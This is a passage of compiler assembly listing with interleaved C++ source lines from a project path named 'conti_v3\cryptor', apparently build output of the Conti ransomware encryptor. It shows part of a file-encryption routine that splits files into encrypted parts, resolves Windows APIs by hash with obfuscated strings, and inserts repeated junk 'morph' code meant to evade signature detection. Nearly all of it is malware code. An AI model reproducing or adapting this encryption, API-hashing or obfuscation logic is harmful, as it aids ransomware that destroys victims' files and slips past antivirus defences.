  01110	8b 45 df	 mov	 eax, DWORD PTR _morph_var$1[rbp-81]
  01113	ff c0		 inc	 eax
  01115	89 45 df	 mov	 DWORD PTR _morph_var$1[rbp-81], eax
  01118	8b 45 df	 mov	 eax, DWORD PTR _morph_var$1[rbp-81]
  0111b	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01120	7d 07		 jge	 SHORT $LN1167@EncryptPar
  01122	ff c8		 dec	 eax
  01124	83 c8 fc	 or	 eax, -4
  01127	ff c0		 inc	 eax
$LN1167@EncryptPar:
  01129	85 c0		 test	 eax, eax
  0112b	74 e3		 je	 SHORT $LL665@EncryptPar

; 51   : 	}

  0112d	eb 51		 jmp	 SHORT $LN672@EncryptPar
$LN673@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  0112f	8b 45 df	 mov	 eax, DWORD PTR _morph_var$1[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01132	b9 02 00 00 00	 mov	 ecx, 2
  01137	8b 45 df	 mov	 eax, DWORD PTR _morph_var$1[rbp-81]
  0113a	41 2b cf	 sub	 ecx, r15d
  0113d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0113f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01144	89 4d df	 mov	 DWORD PTR _morph_var$1[rbp-81], ecx
  01147	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$1[rbp-81]
  0114a	f7 e9		 imul	 ecx
  0114c	8b c2		 mov	 eax, edx
  0114e	c1 e8 1f	 shr	 eax, 31
  01151	03 d0		 add	 edx, eax
  01153	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01156	3b c8		 cmp	 ecx, eax
  01158	75 26		 jne	 SHORT $LN672@EncryptPar
  0115a	66 0f 1f 44 00
	00		 npad	 6
$LL667@EncryptPar:
  01160	8b 45 df	 mov	 eax, DWORD PTR _morph_var$1[rbp-81]
  01163	ff c0		 inc	 eax
  01165	89 45 df	 mov	 DWORD PTR _morph_var$1[rbp-81], eax
  01168	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0116d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$1[rbp-81]
  01170	f7 e9		 imul	 ecx
  01172	8b c2		 mov	 eax, edx
  01174	c1 e8 1f	 shr	 eax, 31
  01177	03 d0		 add	 edx, eax
  01179	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0117c	3b c8		 cmp	 ecx, eax
  0117e	74 e0		 je	 SHORT $LL667@EncryptPar
$LN672@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1067 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  01180	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  01184	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  01188	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0118b	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$17[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01192	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$17[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1067 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  01195	48 99		 cdq
  01197	48 2b c2	 sub	 rax, rdx
  0119a	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  011a1	48 d1 f8	 sar	 rax, 1
  011a4	4c 8b e0	 mov	 r12, rax
  011a7	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  011ab	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  011b0	f7 e9		 imul	 ecx
  011b2	8b c2		 mov	 eax, edx
  011b4	c1 e8 1f	 shr	 eax, 31
  011b7	03 d0		 add	 edx, eax
  011b9	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  011bc	3b c8		 cmp	 ecx, eax
  011be	74 52		 je	 SHORT $LN337@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  011c0	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$17[rbp-81]
  011c3	83 c1 02	 add	 ecx, 2
  011c6	41 03 cc	 add	 ecx, r12d
  011c9	89 4d df	 mov	 DWORD PTR _morph_var$17[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  011cc	8b 45 df	 mov	 eax, DWORD PTR _morph_var$17[rbp-81]
  011cf	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  011d4	7d 07		 jge	 SHORT $LN1165@EncryptPar
  011d6	ff c8		 dec	 eax
  011d8	83 c8 fc	 or	 eax, -4
  011db	ff c0		 inc	 eax
$LN1165@EncryptPar:
  011dd	85 c0		 test	 eax, eax
  011df	0f 85 4b 02 00
	00		 jne	 $LN378@EncryptPar
  011e5	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL329@EncryptPar:
  011f0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$17[rbp-81]
  011f3	ff c0		 inc	 eax
  011f5	89 45 df	 mov	 DWORD PTR _morph_var$17[rbp-81], eax
  011f8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$17[rbp-81]
  011fb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01200	7d 07		 jge	 SHORT $LN1164@EncryptPar
  01202	ff c8		 dec	 eax
  01204	83 c8 fc	 or	 eax, -4
  01207	ff c0		 inc	 eax
$LN1164@EncryptPar:
  01209	85 c0		 test	 eax, eax
  0120b	74 e3		 je	 SHORT $LL329@EncryptPar

; 51   : 	}

  0120d	e9 1e 02 00 00	 jmp	 $LN378@EncryptPar
$LN337@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  01212	8b 45 df	 mov	 eax, DWORD PTR _morph_var$17[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01215	b9 02 00 00 00	 mov	 ecx, 2
  0121a	8b 45 df	 mov	 eax, DWORD PTR _morph_var$17[rbp-81]
  0121d	41 2b cc	 sub	 ecx, r12d
  01220	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  01222	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01227	89 4d df	 mov	 DWORD PTR _morph_var$17[rbp-81], ecx
  0122a	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$17[rbp-81]
  0122d	f7 e9		 imul	 ecx
  0122f	8b c2		 mov	 eax, edx
  01231	c1 e8 1f	 shr	 eax, 31
  01234	03 d0		 add	 edx, eax
  01236	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01239	3b c8		 cmp	 ecx, eax
  0123b	0f 85 ef 01 00
	00		 jne	 $LN378@EncryptPar
  01241	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL331@EncryptPar:
  01250	8b 45 df	 mov	 eax, DWORD PTR _morph_var$17[rbp-81]
  01253	ff c0		 inc	 eax
  01255	89 45 df	 mov	 DWORD PTR _morph_var$17[rbp-81], eax
  01258	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0125d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$17[rbp-81]
  01260	f7 e9		 imul	 ecx
  01262	8b c2		 mov	 eax, edx
  01264	c1 e8 1f	 shr	 eax, 31
  01267	03 d0		 add	 edx, eax
  01269	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0126c	3b c8		 cmp	 ecx, eax
  0126e	74 e0		 je	 SHORT $LL331@EncryptPar

; 55   : 	}

  01270	e9 bb 01 00 00	 jmp	 $LN378@EncryptPar
$LN19@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1072 : 		PartSize = (FileInfo->FileSize / 100) * 27;

  01275	48 b8 0b d7 a3
	70 3d 0a d7 a3	 mov	 rax, -6640827866535438581 ; a3d70a3d70a3d70bH
  0127f	48 f7 6f 10	 imul	 QWORD PTR [rdi+16]
  01283	48 03 57 10	 add	 rdx, QWORD PTR [rdi+16]
  01287	48 c1 fa 06	 sar	 rdx, 6
  0128b	48 8b c2	 mov	 rax, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0128e	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$16[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01295	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$16[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1072 : 		PartSize = (FileInfo->FileSize / 100) * 27;

  01298	48 c1 e8 3f	 shr	 rax, 63			; 0000003fH
  0129c	48 03 d0	 add	 rdx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0129f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1072 : 		PartSize = (FileInfo->FileSize / 100) * 27;

  012a4	4c 6b fa 1b	 imul	 r15, rdx, 27
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  012a8	f7 e9		 imul	 ecx
  012aa	8b c2		 mov	 eax, edx
  012ac	c1 e8 1f	 shr	 eax, 31
  012af	03 d0		 add	 edx, eax
  012b1	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  012b4	3b c8		 cmp	 ecx, eax
  012b6	74 47		 je	 SHORT $LN358@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  012b8	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$16[rbp-81]
  012bb	83 c1 02	 add	 ecx, 2
  012be	41 03 cf	 add	 ecx, r15d
  012c1	89 4d df	 mov	 DWORD PTR _morph_var$16[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  012c4	8b 45 df	 mov	 eax, DWORD PTR _morph_var$16[rbp-81]
  012c7	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  012cc	7d 07		 jge	 SHORT $LN1162@EncryptPar
  012ce	ff c8		 dec	 eax
  012d0	83 c8 fc	 or	 eax, -4
  012d3	ff c0		 inc	 eax
$LN1162@EncryptPar:
  012d5	85 c0		 test	 eax, eax
  012d7	75 77		 jne	 SHORT $LN357@EncryptPar
  012d9	0f 1f 80 00 00
	00 00		 npad	 7
$LL350@EncryptPar:
  012e0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$16[rbp-81]
  012e3	ff c0		 inc	 eax
  012e5	89 45 df	 mov	 DWORD PTR _morph_var$16[rbp-81], eax
  012e8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$16[rbp-81]
  012eb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  012f0	7d 07		 jge	 SHORT $LN1161@EncryptPar
  012f2	ff c8		 dec	 eax
  012f4	83 c8 fc	 or	 eax, -4
  012f7	ff c0		 inc	 eax
$LN1161@EncryptPar:
  012f9	85 c0		 test	 eax, eax
  012fb	74 e3		 je	 SHORT $LL350@EncryptPar

; 51   : 	}

  012fd	eb 51		 jmp	 SHORT $LN357@EncryptPar
$LN358@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  012ff	8b 45 df	 mov	 eax, DWORD PTR _morph_var$16[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  01302	b9 02 00 00 00	 mov	 ecx, 2
  01307	8b 45 df	 mov	 eax, DWORD PTR _morph_var$16[rbp-81]
  0130a	41 2b cf	 sub	 ecx, r15d
  0130d	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  0130f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01314	89 4d df	 mov	 DWORD PTR _morph_var$16[rbp-81], ecx
  01317	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$16[rbp-81]
  0131a	f7 e9		 imul	 ecx
  0131c	8b c2		 mov	 eax, edx
  0131e	c1 e8 1f	 shr	 eax, 31
  01321	03 d0		 add	 edx, eax
  01323	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01326	3b c8		 cmp	 ecx, eax
  01328	75 26		 jne	 SHORT $LN357@EncryptPar
  0132a	66 0f 1f 44 00
	00		 npad	 6
$LL352@EncryptPar:
  01330	8b 45 df	 mov	 eax, DWORD PTR _morph_var$16[rbp-81]
  01333	ff c0		 inc	 eax
  01335	89 45 df	 mov	 DWORD PTR _morph_var$16[rbp-81], eax
  01338	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0133d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$16[rbp-81]
  01340	f7 e9		 imul	 ecx
  01342	8b c2		 mov	 eax, edx
  01344	c1 e8 1f	 shr	 eax, 31
  01347	03 d0		 add	 edx, eax
  01349	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0134c	3b c8		 cmp	 ecx, eax
  0134e	74 e0		 je	 SHORT $LL352@EncryptPar
$LN357@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1075 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  01350	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  01354	4b 8d 0c 7f	 lea	 rcx, QWORD PTR [r15+r15*2]
  01358	48 2b c1	 sub	 rax, rcx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0135b	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$15[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01362	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$15[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1075 : 		StepSize = (FileInfo->FileSize - (PartSize * 3)) / 2;

  01365	48 99		 cdq
  01367	48 2b c2	 sub	 rax, rdx
  0136a	c7 45 e3 03 00
	00 00		 mov	 DWORD PTR StepsCount$1$[rbp-81], 3
  01371	48 d1 f8	 sar	 rax, 1
  01374	4c 8b e0	 mov	 r12, rax
  01377	48 89 45 e7	 mov	 QWORD PTR StepSize$1$[rbp-81], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  0137b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01380	f7 e9		 imul	 ecx
  01382	8b c2		 mov	 eax, edx
  01384	c1 e8 1f	 shr	 eax, 31
  01387	03 d0		 add	 edx, eax
  01389	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0138c	3b c8		 cmp	 ecx, eax
  0138e	74 4f		 je	 SHORT $LN379@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  01390	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$15[rbp-81]
  01393	83 c1 02	 add	 ecx, 2
  01396	41 03 cc	 add	 ecx, r12d
  01399	89 4d df	 mov	 DWORD PTR _morph_var$15[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0139c	8b 45 df	 mov	 eax, DWORD PTR _morph_var$15[rbp-81]
  0139f	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  013a4	7d 07		 jge	 SHORT $LN1159@EncryptPar
  013a6	ff c8		 dec	 eax
  013a8	83 c8 fc	 or	 eax, -4
  013ab	ff c0		 inc	 eax
$LN1159@EncryptPar:
  013ad	85 c0		 test	 eax, eax
  013af	75 7f		 jne	 SHORT $LN378@EncryptPar
  013b1	0f 1f 40 00 66
	66 66 0f 1f 84
	00 00 00 00 00	 npad	 15
$LL371@EncryptPar:
  013c0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$15[rbp-81]
  013c3	ff c0		 inc	 eax
  013c5	89 45 df	 mov	 DWORD PTR _morph_var$15[rbp-81], eax
  013c8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$15[rbp-81]
  013cb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  013d0	7d 07		 jge	 SHORT $LN1158@EncryptPar
  013d2	ff c8		 dec	 eax
  013d4	83 c8 fc	 or	 eax, -4
  013d7	ff c0		 inc	 eax
$LN1158@EncryptPar:
  013d9	85 c0		 test	 eax, eax
  013db	74 e3		 je	 SHORT $LL371@EncryptPar

; 51   : 	}

  013dd	eb 51		 jmp	 SHORT $LN378@EncryptPar
$LN379@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  013df	8b 45 df	 mov	 eax, DWORD PTR _morph_var$15[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  013e2	b9 02 00 00 00	 mov	 ecx, 2
  013e7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$15[rbp-81]
  013ea	41 2b cc	 sub	 ecx, r12d
  013ed	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  013ef	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  013f4	89 4d df	 mov	 DWORD PTR _morph_var$15[rbp-81], ecx
  013f7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$15[rbp-81]
  013fa	f7 e9		 imul	 ecx
  013fc	8b c2		 mov	 eax, edx
  013fe	c1 e8 1f	 shr	 eax, 31
  01401	03 d0		 add	 edx, eax
  01403	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01406	3b c8		 cmp	 ecx, eax
  01408	75 26		 jne	 SHORT $LN378@EncryptPar
  0140a	66 0f 1f 44 00
	00		 npad	 6
$LL373@EncryptPar:
  01410	8b 45 df	 mov	 eax, DWORD PTR _morph_var$15[rbp-81]
  01413	ff c0		 inc	 eax
  01415	89 45 df	 mov	 DWORD PTR _morph_var$15[rbp-81], eax
  01418	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0141d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$15[rbp-81]
  01420	f7 e9		 imul	 ecx
  01422	8b c2		 mov	 eax, edx
  01424	c1 e8 1f	 shr	 eax, 31
  01427	03 d0		 add	 edx, eax
  01429	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0142c	3b c8		 cmp	 ecx, eax
  0142e	74 e0		 je	 SHORT $LL373@EncryptPar
$LN378@EncryptPar:
  01430	48 89 9c 24 c0
	00 00 00	 mov	 QWORD PTR [rsp+192], rbx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1083 : 	for (INT i = 0; i < StepsCount; i++) {

  01438	41 b8 00 00 50
	00		 mov	 r8d, 5242880		; 00500000H
  0143e	48 89 b4 24 80
	00 00 00	 mov	 QWORD PTR [rsp+128], rsi
  01446	4c 89 6c 24 78	 mov	 QWORD PTR [rsp+120], r13
  0144b	45 33 ed	 xor	 r13d, r13d
  0144e	44 89 6d ef	 mov	 DWORD PTR i$1$[rbp-81], r13d
  01452	4c 89 74 24 70	 mov	 QWORD PTR [rsp+112], r14
  01457	66 0f 1f 84 00
	00 00 00 00	 npad	 9
$LL6@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  01460	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$24[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01467	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0146c	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$24[rbp-81]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1085 : 		TotalRead = 0;

  0146f	45 33 f6	 xor	 r14d, r14d
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  01472	f7 e9		 imul	 ecx
  01474	8b c2		 mov	 eax, edx
  01476	c1 e8 1f	 shr	 eax, 31
  01479	03 d0		 add	 edx, eax
  0147b	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0147e	3b c8		 cmp	 ecx, eax
  01480	74 4d		 je	 SHORT $LN188@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  01482	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$24[rbp-81]
  01485	83 c1 02	 add	 ecx, 2
  01488	41 03 cf	 add	 ecx, r15d
  0148b	89 4d df	 mov	 DWORD PTR _morph_var$24[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  0148e	8b 45 df	 mov	 eax, DWORD PTR _morph_var$24[rbp-81]
  01491	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01496	7d 07		 jge	 SHORT $LN1156@EncryptPar
  01498	ff c8		 dec	 eax
  0149a	83 c8 fc	 or	 eax, -4
  0149d	ff c0		 inc	 eax
$LN1156@EncryptPar:
  0149f	85 c0		 test	 eax, eax
  014a1	75 7d		 jne	 SHORT $LN187@EncryptPar
  014a3	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL180@EncryptPar:
  014b0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$24[rbp-81]
  014b3	ff c0		 inc	 eax
  014b5	89 45 df	 mov	 DWORD PTR _morph_var$24[rbp-81], eax
  014b8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$24[rbp-81]
  014bb	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  014c0	7d 07		 jge	 SHORT $LN1155@EncryptPar
  014c2	ff c8		 dec	 eax
  014c4	83 c8 fc	 or	 eax, -4
  014c7	ff c0		 inc	 eax
$LN1155@EncryptPar:
  014c9	85 c0		 test	 eax, eax
  014cb	74 e3		 je	 SHORT $LL180@EncryptPar

; 51   : 	}

  014cd	eb 51		 jmp	 SHORT $LN187@EncryptPar
$LN188@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  014cf	8b 45 df	 mov	 eax, DWORD PTR _morph_var$24[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  014d2	b9 02 00 00 00	 mov	 ecx, 2
  014d7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$24[rbp-81]
  014da	41 2b cf	 sub	 ecx, r15d
  014dd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  014df	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  014e4	89 4d df	 mov	 DWORD PTR _morph_var$24[rbp-81], ecx
  014e7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$24[rbp-81]
  014ea	f7 e9		 imul	 ecx
  014ec	8b c2		 mov	 eax, edx
  014ee	c1 e8 1f	 shr	 eax, 31
  014f1	03 d0		 add	 edx, eax
  014f3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  014f6	3b c8		 cmp	 ecx, eax
  014f8	75 26		 jne	 SHORT $LN187@EncryptPar
  014fa	66 0f 1f 44 00
	00		 npad	 6
$LL182@EncryptPar:
  01500	8b 45 df	 mov	 eax, DWORD PTR _morph_var$24[rbp-81]
  01503	ff c0		 inc	 eax
  01505	89 45 df	 mov	 DWORD PTR _morph_var$24[rbp-81], eax
  01508	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  0150d	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$24[rbp-81]
  01510	f7 e9		 imul	 ecx
  01512	8b c2		 mov	 eax, edx
  01514	c1 e8 1f	 shr	 eax, 31
  01517	03 d0		 add	 edx, eax
  01519	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0151c	3b c8		 cmp	 ecx, eax
  0151e	74 e0		 je	 SHORT $LL182@EncryptPar
$LN187@EncryptPar:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1089 : 		if (i != 0) {

  01520	45 85 ed	 test	 r13d, r13d
  01523	0f 84 ed 00 00
	00		 je	 $LN782@EncryptPar

; 1092 : 			if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  01529	48 8b 5f 08	 mov	 rbx, QWORD PTR [rdi+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  0152d	ba 0f 00 00 00	 mov	 edx, 15
  01532	41 b8 a7 1b e5
	d6		 mov	 r8d, -689628249		; d6e51ba7H
  01538	44 8d 4a 4a	 lea	 r9d, QWORD PTR [rdx+74]
  0153c	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  01541	41 b9 01 00 00
	00		 mov	 r9d, 1
  01547	45 33 c0	 xor	 r8d, r8d
  0154a	49 8b d4	 mov	 rdx, r12
  0154d	48 8b cb	 mov	 rcx, rbx
  01550	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 1092 : 			if (!pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_CURRENT)) {

  01552	85 c0		 test	 eax, eax
  01554	0f 84 c8 06 00
	00		 je	 $LN814@EncryptPar
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  0155a	c7 45 df c1 9b
	17 00		 mov	 DWORD PTR _morph_var$23[rbp-81], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  01561	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01566	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$23[rbp-81]
  01569	f7 e9		 imul	 ecx
  0156b	8b c2		 mov	 eax, edx
  0156d	c1 e8 1f	 shr	 eax, 31
  01570	03 d0		 add	 edx, eax
  01572	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01575	3b c8		 cmp	 ecx, eax
  01577	74 46		 je	 SHORT $LN211@EncryptPar

; 49   : 		_morph_var += (int)a + 2;

  01579	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$23[rbp-81]
  0157c	83 c1 02	 add	 ecx, 2
  0157f	41 03 cc	 add	 ecx, r12d
  01582	89 4d df	 mov	 DWORD PTR _morph_var$23[rbp-81], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01585	8b 45 df	 mov	 eax, DWORD PTR _morph_var$23[rbp-81]
  01588	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0158d	7d 07		 jge	 SHORT $LN1153@EncryptPar
  0158f	ff c8		 dec	 eax
  01591	83 c8 fc	 or	 eax, -4
  01594	ff c0		 inc	 eax
$LN1153@EncryptPar:
  01596	85 c0		 test	 eax, eax
  01598	75 76		 jne	 SHORT $LN1228@EncryptPar
  0159a	66 0f 1f 44 00
	00		 npad	 6
$LL203@EncryptPar:
  015a0	8b 45 df	 mov	 eax, DWORD PTR _morph_var$23[rbp-81]
  015a3	ff c0		 inc	 eax
  015a5	89 45 df	 mov	 DWORD PTR _morph_var$23[rbp-81], eax
  015a8	8b 45 df	 mov	 eax, DWORD PTR _morph_var$23[rbp-81]
  015ab	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  015b0	7d 07		 jge	 SHORT $LN1152@EncryptPar
  015b2	ff c8		 dec	 eax
  015b4	83 c8 fc	 or	 eax, -4
  015b7	ff c0		 inc	 eax
$LN1152@EncryptPar:
  015b9	85 c0		 test	 eax, eax
  015bb	74 e3		 je	 SHORT $LL203@EncryptPar

; 51   : 	}

  015bd	eb 51		 jmp	 SHORT $LN1228@EncryptPar
$LN211@EncryptPar:

; 52   : 	else if (_morph_var % 2) {

  015bf	8b 45 df	 mov	 eax, DWORD PTR _morph_var$23[rbp-81]

; 53   : 		_morph_var -= (int)a - 2;

  015c2	b9 02 00 00 00	 mov	 ecx, 2
  015c7	8b 45 df	 mov	 eax, DWORD PTR _morph_var$23[rbp-81]
  015ca	41 2b cc	 sub	 ecx, r12d
  015cd	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  015cf	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  015d4	89 4d df	 mov	 DWORD PTR _morph_var$23[rbp-81], ecx
  015d7	8b 4d df	 mov	 ecx, DWORD PTR _morph_var$23[rbp-81]
  015da	f7 e9		 imul	 ecx
  015dc	8b c2		 mov	 eax, edx
  015de	c1 e8 1f	 shr	 eax, 31
  015e1	03 d0		 add	 edx, eax
  015e3	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  015e6	3b c8		 cmp	 ecx, eax
